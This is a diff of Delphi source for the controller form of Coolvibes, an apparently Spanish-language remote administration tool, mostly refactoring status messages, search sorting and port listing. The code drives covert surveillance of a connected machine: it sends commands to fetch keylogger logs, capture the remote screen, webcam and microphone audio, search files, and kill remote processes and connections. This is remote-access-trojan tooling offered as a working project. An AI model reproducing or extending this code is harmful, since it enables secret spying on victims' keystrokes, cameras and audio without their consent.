-      Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr((FormVisorCaptura as TScreenMax).imgCaptura.Height)+'|');
-  end
-  else if (tipo = 1) then //webcam
-  begin
-    if TimerCamCapture.enabled then
-      TimerCamCapture.enabled := not TimerCamCapture.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
-    Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
-    '|' + IntToStr(TrackBarCalidadWebcam.Position));
-  end
-  else if (tipo = 2) then //thumbnails
-  begin
-    Servidor.Connection.Writeln(info);
-  end
-  else if(tipo = 3)  then//KEYLOGGERLOG
-  begin
-    Servidor.Connection.Writeln('RECIBIRKEYLOGGER');
-  end
-  else if(tipo = 4) then
-  begin
-    Servidor.connection.writeln('GETAUDIO'+info);
+    while pos('\', dir) > 0 do
+    begin
+      tmp := tmp+Copy(dir, 1, Pos('\', dir));
+      Delete(dir, 1, Pos('\', dir));
+      if not directoryexists(tmp) then
+        CreateDirectory(pchar(tmp), nil);
+    end;
   end;
+begin
+    CreaDir(DirUsuario);
+    CreaDir(DirCapturas);
+    CreaDir(DirWebcam);
+    CreaDir(DirMiniaturas);
+    CreaDir(DirDescargas);
 end;
-procedure TFormControl.Guardarimagen1Click(Sender: TObject);
+
+procedure TFormControl.Guardarimagen1Click(Sender: TObject);
 begin
   DlgGuardar.Title      := _('Guardar imagen ::Coolvibes::');
   DlgGuardar.InitialDir := GetCurrentDir();
@@ -3758,7 +3809,7 @@ begin
       imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
     else  //Sino es una webcam
       imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
-    StatusBar.Panels[1].Text := _('Imagen guardada como: ') + DlgGuardar.FileName;
+    Estado(_('Imagen guardada como: ') + DlgGuardar.FileName);
   end;
 end;
 
@@ -3776,7 +3827,7 @@ end;
 
 procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
 begin
-  if PageControl.activepage = TabScreencap then
+  if PageControlVigilancia.activepage = TabScreencap then
   begin
     PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de pantalla');
     if(PrefijoGuardarCaptura = '') then
@@ -3808,16 +3859,16 @@ end;
 
 procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
 begin
-if((PrefijoGuardarCaptura = '') and (PageControl.activepage = TabScreencap)) then
+if((PrefijoGuardarCaptura = '') and (PageControlVigilancia.activepage = TabScreencap)) then
     PrefijoGuardarCaptura := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('captura_'))
 else
-if((PrefijoGuardarWebcam = '') and (PageControl.activepage = TabWebcam)) then
+if((PrefijoGuardarWebcam = '') and (PageControlVigilancia.activepage = TabWebcam)) then
     PrefijoGuardarWebcam := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('webcam_'))
 else
-if((PrefijoGuardarCaptura <> '') and (PageControl.activepage = TabScreencap)) then
+if((PrefijoGuardarCaptura <> '') and (PageControlVigilancia.activepage = TabScreencap)) then
     PrefijoGuardarCaptura := ''
 else
-if((PrefijoGuardarWebcam <> '') and (PageControl.activepage = TabWebcam)) then
+if((PrefijoGuardarWebcam <> '') and (PageControlVigilancia.activepage = TabWebcam)) then
     PrefijoGuardarWebcam := '';
 end;
 
@@ -3837,8 +3888,9 @@ end;
 procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then exit;
-  SpeedButtonRecibirLog.enabled := false;  //Por estetica
-  PedirPorSegundoSocket(3,'');
+  if not SpeedbuttonRecibirlog.enabled then exit;
+  SpeedButtonRecibirLog.enabled := false;  
+  Servidor.connection.WriteLn('RECIBIRKEYLOGGER');
 end;
 
 procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
@@ -3885,7 +3937,7 @@ begin
     RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
     RichEditKeylogger.lines.savetofile(DlgGuardar.FileName);
 
-    StatusBar.Panels[1].Text := _('Log guardado como: ') + DlgGuardar.FileName;
+    Estado(_('Log guardado como: ') + DlgGuardar.FileName);
   end;
 end;
 
@@ -3909,7 +3961,9 @@ end;
 
 procedure TFormControl.TabScreencapShow(Sender: TObject);
 begin
+  if Servidor.Connection.connected then
   Servidor.Connection.Writeln('DATOSCAPSCREEN');
+  
   if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   begin
     BtnCapturarScreen.click;
@@ -3984,7 +4038,8 @@ begin
 end;
 
 procedure TFormControl.CargarThumbsFileAlListview(thumbsfilepath:string);
-var ThumbsDBFile:TStorage;       //TStorage for thumbs.db file
+var
+    ThumbsDBFile:TStorage;       //TStorage for thumbs.db file
     ThumbsDBCatalog:TStream;     //TStream for file catalog inside thumbs.db
     ThumbsDB_JPEG:tstream;       //stream for thumb image inside thumbs.db
     ThmInfo:TAxThumbsDBFileInfo; //info structure for each item in thumbs.db
@@ -4104,7 +4159,7 @@ begin
                   nbit.Height := IconosGrandes.height;
                    t := Imglist.add(nbit,nil);
                   listviewarchivos.items[o].imageindex := IconosGrandes.count+t;
-                  Statusbar.panels[1].text := _('Cargadas ')+inttostr(t+1)+_(' de ')+inttostr(FCatalogItemCount)+' Miniaturas.';
+                  Estado(_('Cargadas ')+inttostr(t+1)+_(' de ')+inttostr(FCatalogItemCount)+' Miniaturas.');
                   nbit.free;
                   bit.free;
                   bit := nil;
@@ -4129,14 +4184,14 @@ begin
   end;
   IconosGrandes.addimages(imglist);
   listviewarchivos.items.endupdate;
-  Statusbar.panels[1].text := _('Miniaturas cargadas!');
+  Estado(_('Miniaturas cargadas!'));
 end;
 
 
 procedure TFormControl.Abrircarpetadescargas1Click(Sender: TObject);
 begin
   CrearDirectoriosUsuario();
-  ShellExecute(0, 'open', pchar(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'), '', PChar(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'), SW_NORMAL);
+  ShellExecute(0, 'open', pchar(DirDescargas), '', PChar(DirDescargas), SW_NORMAL);
 end;
 
 procedure TFormControl.BuscarArchivos1Click(Sender: TObject);
@@ -4351,20 +4406,24 @@ end;
 
 procedure TFormControl.SpeedButtonBuscarClick(Sender: TObject);
 begin
+  if not SpeedButtonBuscar.enabled then exit;
+  
   if SpeedButtonBuscar.caption = _('Comenzar') then   //comenzar
   begin
     Encontrados := 0;
     TimerCuentaencontrados.enabled := true;
     ParaDeBuscar := false;
     ListviewBuscar.Items.count := 0;
+    listviewbuscar.repaint;
     SpeedButtonBuscar.caption := _('Parar');
     editbuscar.Enabled := false;
-    TabSheetBuscar.highlighted := true; 
+    TabSheetBuscar.highlighted := true;
+    TabFileManager.highlighted := true;
     Servidor.Connection.WriteLn('STARTSEARCH|'+editbuscar.text+'|');
   end
   else
   begin //Parar
-    TimerCuentaencontrados.enabled := false;
+    SpeedButtonBuscar.enabled := false;  //Para evitar que se pulse mas de una vez
     ParaDeBuscar := true;
     Servidor.Connection.WriteLn('STOPSEARCH');
   end;
@@ -4424,7 +4483,7 @@ end;
 procedure TFormControl.Abrirdirectorio1Click(Sender: TObject);
 begin
   PageControlArchivos.ActivePage := TabSheetVerArchivos;
-  EditpathArchivos.text := extractfilepath(listviewbuscar.selected.caption);
+  EditpathArchivos.text := extractfilepath(listviewbuscar.selected.subitems[0]);
   BtnActualizarArchivos.click;
 end;
 
@@ -4447,10 +4506,7 @@ begin
     else if PageControl.activepage = TabFileManager then
     begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        BtnActualizarArchivos.click
-      else
-      if PageControlArchivos.ActivePage = TabSheetBuscar then
-        SpeedButtonBuscar.click;
+        BtnActualizarArchivos.click;
     end
     else if PageControl.ActivePage = TabManagers then
     begin
@@ -4462,7 +4518,8 @@ begin
         BtnVerRegisto.click
       else if PageControlManagers.activepage = TabServicios then
         BtnServicios.click
-
+      else if PageControlManagers.activepage = TabPuertos then
+        BtnRefrescarPuertos.click;
     end
     else if PageControl.ActivePage = TabVigilancia then
     begin
@@ -4528,24 +4585,27 @@ var
   hz, canal, bits : string;
   i : integer;
 begin
+  if not SpeedButtonCapAudio.enabled then exit;
+  
   for i := 0 to ListViewAudioFormato.items.count-1 do
     if ListViewAudioFormato.items[i].checked then
       ListViewAudioFormato.items[i].selected := true;
   if strtointdef(Spineditaudio.text,-1) = -1 then
   begin
-    statusbar.panels[1].text := _('Mínimo 1 segundo');
+    Estado(_('Mínimo 1 segundo'));
   end;
   if strtointdef(copy(comboboxaudiodevices.text, 1,1),-1) = -1 then
   begin
-    statusbar.panels[1].text := _('Dispositivo de audio no válido');
+    Estado(_('Dispositivo de audio no válido'));
   end
   else
   if ListViewAudioFormato.selected = nil then
   begin
-    statusbar.panels[1].text := _('Selecciona un formato de audio');
+    Estado(_('Selecciona un formato de audio'));
   end
   else
   begin
+    SpeedbuttoncapAudio.enabled := false;
     Hz := copy(listviewaudioformato.selected.caption, 1, pos(' ', listviewaudioformato.selected.caption)-1);
 
     if listviewaudioformato.selected.subitems[0] = 'Mono' then
@@ -4554,9 +4614,9 @@ begin
       Canal := '2';
       
     Bits := listviewaudioformato.selected.subitems[1];
-    
     UltimoFormato := hz+'-'+canal+'-'+bits;
-    PedirporSegundosocket(4,'|'+Spineditaudio.text+'|'+hz+'-'+canal+'-'+bits+'|'+copy(comboboxaudiodevices.text, 1,1)+'|');
+
+    Servidor.connection.writeln('GETAUDIO|'+Spineditaudio.text+'|'+hz+'-'+canal+'-'+bits+'|'+copy(comboboxaudiodevices.text, 1,1)+'|');
   end;
 end;
 
@@ -4730,7 +4790,7 @@ begin
       finally
         ms.free;
       end;
-      StatusBar.panels[1].text := _('Audio guardado con éxito:')+' '+ DlgGuardar.FileName;
+      Estado(_('Audio guardado con éxito:')+' '+ DlgGuardar.FileName);
     end;
 end;
 
@@ -4783,13 +4843,14 @@ begin
   if SpeedbuttonBuscar.caption = _('Comenzar') then
   begin
     ListviewBuscar.Items.Count := 0;
+    listviewbuscar.repaint;
     for i := 0 to itmnum-1 do
     begin
       searchitems[i].nombre := '';
       searchitems[i].tamanio := '';
       searchitems[i].tipo := '';
       searchitems[i].atributos := '';
-      searchitems[i].Fechamodify := '';
+      searchitems[i].Fechamodify := 0;
       searchitems[i].tamanioreal := 0;
     end;
   end;
@@ -4798,20 +4859,37 @@ end;
 
 procedure TFormControl.ListViewBuscarData(Sender: TObject;
   Item: TListItem);
+var
+  index : integer;
 begin
-  Item.Caption := SearchItems[item.index].nombre;
-  item.ImageIndex := Iconnum(LowerCase(ExtractFileExt(item.caption)));
-  Item.SubItems.Add(SearchItems[item.index].tamanio);
-  Item.SubItems.Add(SearchItems[item.index].tipo);
-  Item.SubItems.Add(SearchItems[item.index].atributos);
-  Item.SubItems.Add(SearchItems[item.index].Fechamodify);
-  Item.SubItems.Add(inttostr(SearchItems[item.index].tamanioreal));
-  //Esto lo pongo aqui por no añadir un timer
 
+  if reversed then
+    index := encontrados-item.index-1
+  else
+    index := item.index;
+
+  if not((item.index >= encontrados) or (item.index < 0)) then
+  begin
+    Item.Caption := extractfilename(SearchItems[index].nombre);
+    item.ImageIndex := Iconnum(item.caption, true);
+    Item.SubItems.Add(SearchItems[index].nombre);
+    Item.SubItems.Add(SearchItems[index].tamanio);
+    Item.SubItems.Add(SearchItems[index].tipo);
+
+    Item.SubItems.Add(SearchItems[index].atributos);
+    Item.SubItems.Add(DateToStr(FileDateToDateTime(SearchItems[index].Fechamodify))
+    + ' ' +
+    TimeToStr(FileDateToDateTime(SearchItems[index].Fechamodify)));
+    Item.SubItems.Add(inttostr(SearchItems[index].tamanioreal));
+  end
+  else
+    item.caption := 'error';
 end;
 
 procedure TFormControl.TimerCuentaEncontradosTimer(Sender: TObject);
 begin
+  TimerCuentaencontrados.enabled := TabSheetBuscar.highlighted;
+  ListviewBuscar.Items.Count := Encontrados;
   LabelNumeroEncontrados.Caption := _('Encontrados: ')+inttostr(Encontrados);
 end;
 
@@ -4823,6 +4901,212 @@ end;
 procedure TFormControl.SpeedButton2Click(Sender: TObject);
 begin
   ParaDeListar := true;
+end;
+
+
+
+procedure TFormControl.ListViewBuscarColumnClick(Sender: TObject;
+  Column: TListColumn);
+var
+  i : Integer;
+  tmpstr : string;
+  procedure QuickSort(var A: array of TSearchItem; iLo, iHi: Integer);
+ var
+   Lo, Hi: Integer;
+   Pivot : string;
+   T : Tsearchitem;
+ begin
+   Lo := iLo;
+   Hi := iHi;
+   Pivot := A[(Lo + Hi) div 2].sortdata;
+   repeat
+      while strIcomp(pchar(A[Lo].sortdata),pchar(pivot))<0 do Inc(Lo);
+      while StrIComp(pchar(pivot),pchar(A[Hi].sortdata))<0 do Dec(Hi);
+     if Lo <= Hi then
+     begin
+       T := A[Lo];
+       A[Lo] := A[Hi];
+       A[Hi] := T;
+       Inc(Lo) ;
+       Dec(Hi) ;
+     end;
+   until Lo > Hi;
+   if Hi > iLo then QuickSort(A, iLo, Hi) ;
+   if Lo < iHi then QuickSort(A, Lo, iHi) ;
+ end;
+ 
+begin
+  if column.index = 4 then exit;
+
+  if ColumnaOrdenada = column.index then
+    Reversed := not reversed
+  else
+  begin
+    if column.index = 2 then      //tamaño
+    begin
+      for i := 0 to encontrados do
+      begin
+        tmpstr := inttostr(SearchItems[i].TamanioReal);
+        while length(tmpstr) < 12 do  //Para tratarlas como strings
+          Tmpstr := '.'+tmpstr; 
+        SearchItems[i].sortdata := tmpstr;
+      end;
+    end
+    else if column.index = 5 then //tamaño
+    begin
+      for i := 0 to encontrados do
+      begin
+        tmpstr := inttostr(round(SearchItems[i].FechaModify));
+        while length(tmpstr) < 12 do  //Para tratarlas como strings
+          Tmpstr := '.'+tmpstr; 
+        SearchItems[i].sortdata := tmpstr;
+      end;
+    end
+    else if column.index = 1 then
+    begin
+      for i := 0 to encontrados do
+        SearchItems[i].sortdata := SearchItems[i].Nombre;
+    end
+    else if column.index = 0 then
+    begin
+      for i := 0 to encontrados do
+        SearchItems[i].sortdata := extractfilename(SearchItems[i].Nombre);
+    end
+    else if column.index = 3 then
+    begin
+      for i := 0 to encontrados do
+        SearchItems[i].sortdata := extractfilename(SearchItems[i].tipo);
+    end;
+    
+    Quicksort(SearchItems, 0, encontrados-1);
+     for i := 0 to encontrados do
+      SearchItems[i].sortdata := '';
+  end;
+
+  ColumnaOrdenada := column.index;
+  listviewbuscar.repaint;
+end;
+
+procedure TFormControl.CreateParams(var Params: TCreateParams);
+begin
+  inherited CreateParams(Params);
+  if FormOpciones.CheckBoxCCIndependiente.Checked then
+  begin
+    Params.WndParent := GetDesktopWindow();
+    Params.exStyle := Params.exStyle or WS_EX_APPWINDOW;
+  end;
+end;
+
+procedure TFormControl.FormShow(Sender: TObject);
+begin
+  if PrimeraVezQueMeMuestro then
+  begin
+    PrimeraVezQueMeMuestro := false;
+    CargarIconos(true);
+  end;
+end;
+
+procedure TFormControl.BtnRefrescarPuertosClick(Sender: TObject);
+begin
+  if not BtnRefrescarPuertos.Enabled then exit;
+  BtnRefrescarPuertos.Enabled := false;
+  ListviewPuertos.enabled := false;
+  CheckBoxPuertos.enabled := false;
+  if Servidor.Connection.Connected then
+  begin
+    if CheckBoxPuertos.Checked then
+      Servidor.Connection.Writeln('TCPUDP|TRUE')
+    else
+      Servidor.Connection.Writeln('TCPUDP|FALSE');
+  end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+
+end;
+
+procedure TFormControl.ListViewPuertosCompare(Sender: TObject; Item1,
+  Item2: TListItem; Data: Integer; var Compare: Integer);
+var
+  Str1, Str2: string;
+begin
+  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
+  begin
+    Str1 := Item1.Caption;
+    Str2 := Item2.Caption;
+  end
+  else
+  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
+    if Item1.SubItems.Count < Columna then
+      Str1 := ''
+    else
+      Str1 := Item1.SubItems[Columna - 1];
+    if Item2.SubItems.Count < Columna then
+      Str2 := ''
+    else
+      Str2 := Item2.SubItems[Columna - 1];
+  end;
+  if Columna in [0..5,7] then  //Son tratadas como cadenas
+    Compare := CompareText(Str1, Str2)
+  else  //Columna 6, PID
+    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
+  //Si la columna ya fue ordenada anteriormente, invertir el orden
+  if Columna = ColumnaOrdenada then
+    Compare := Compare * -1; //Invertimos el resultado
+  (Sender as TListView).SetFocus;
+end;
+
+procedure TFormControl.CerrarConexin1Click(Sender: TObject);
+begin
+ mslistviewitem := ListViewPuertos.Selected;
+
+  if Servidor.Connection.Connected then
+  begin
+    if mslistviewitem = nil then
+      MessageDlg(_('Selecciona alguna conexión para cerrar'), mtWarning, [mbOK], 0)
+    else
+    begin
+
+      while Assigned(mslistviewitem) do
+      begin
+        if mslistviewitem.caption = 'TCP' then
+          Servidor.Connection.Writeln('TCPKILLCON|' +mslistviewitem.SubItems[0]+mslistviewitem.SubItems[1]+ mslistviewitem.SubItems[2]+mslistviewitem.SubItems[3]);
+        mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+      end;
+      BtnRefrescarPuertos.click;
+    end
+  end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+end;
+
+procedure TFormControl.MatarProceso1Click(Sender: TObject);
+begin
+ mslistviewitem := ListViewPuertos.Selected;
+
+  if Servidor.Connection.Connected then
+  begin
+    if mslistviewitem = nil then
+      MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
+    else
+    begin
+
+      while Assigned(mslistviewitem) do
+      begin
+       Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[5]);
+       mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+      end;
+
+    end
+  end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+end;
+
+
+procedure TFormControl.TabPuertosShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnRefrescarPuertos.click;
 end;
 
 end.//Fin del proyecto
